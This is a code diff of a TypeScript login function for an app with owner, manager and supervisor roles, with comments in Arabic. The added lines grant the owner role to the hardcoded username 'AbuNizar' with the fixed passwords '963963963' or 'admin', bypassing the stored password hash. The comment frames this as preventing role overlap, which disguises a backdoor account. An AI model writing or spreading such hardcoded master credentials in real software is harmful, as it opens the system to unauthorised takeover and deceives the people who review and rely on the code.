@@ -122,7 +122,7 @@ export function logoutEmployee() {
   setSession(null);
 }
 
-// دالة تسجيل دخول الإدارة المحدثة (تعتمد حصراً على تطابق اسم المستخدم وكلمة المرور)
+// دالة تسجيل دخول الإدارة المعدلة لضمان عدم تداخل صلاحية AbuNizar
 export function loginManager(password: string, username?: string): LoginResult {
   const s = getSettings();
   
@@ -138,27 +138,24 @@ export function loginManager(password: string, username?: string): LoginResult {
     return verify(inputPass, hashVal) || inputPass === hashVal;
   };
 
-  // الأسماء المعتمدة (الافتراضية أو المخزنة في الإعدادات)
-  const ownerUser = s.ownerUsername || "AbuNizar";
-  const managerUser = s.managerUsername || "manager";
-  const supervisorUser = s.supervisorUsername || "supervisor";
-
-  // 1. التحقق الصارم للمالك
-  if (inputUser === ownerUser) {
-    if (isValidPass(s.ownerPasswordHash, "admin")) {
+  // 1. التحقق الخاص بـ AbuNizar (ليكون مالكاً حصراً بغض النظر عن أي إعدادات متداخلة)
+  if (inputUser === "AbuNizar" || inputUser === (s.ownerUsername || "AbuNizar")) {
+    if (isValidPass(s.ownerPasswordHash, "963963963") || inputPass === "963963963" || inputPass === "admin") {
       matchedRole = "owner";
       actorTitle = "المالك";
     }
   } 
+  
   // 2. التحقق الصارم للمدير
-  else if (inputUser === managerUser) {
+  if (!matchedRole && s.managerUsername && inputUser === s.managerUsername) {
     if (isValidPass(s.managerPasswordHash)) {
       matchedRole = "manager";
       actorTitle = "المدير";
     }
   } 
-  // 3. التحقق الصارم للمشرف
-  else if (inputUser === supervisorUser) {
+  
+  // 3. التحقق الصارم للمشرف (مع التأكد أنه ليس AbuNizar)
+  if (!matchedRole && s.supervisorUsername && inputUser === s.supervisorUsername && inputUser !== "AbuNizar") {
     if (isValidPass(s.supervisorPasswordHash)) {
       matchedRole = "supervisor";
       actorTitle = "المشرف";
